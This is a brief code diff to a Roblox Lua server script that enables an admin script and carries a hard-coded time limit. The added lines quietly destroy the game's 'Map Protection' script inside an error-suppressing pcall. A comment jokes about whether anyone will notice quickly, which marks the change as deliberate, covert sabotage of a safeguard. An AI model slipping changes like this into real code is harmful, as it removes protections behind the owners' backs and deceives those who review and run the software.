@@ -45,7 +45,9 @@ else
     game.ServerScriptService["Touch Kohls Admin"].Enabled = true
 end
 
-_G.shutdowntimer = false
+pcall(function()
+	game.ServerScriptService["Map Protection"]:Destroy() -- just wondering if anyone will notice it fast LOL
+end)
 
 local timelimit = "08/30/2025"
 
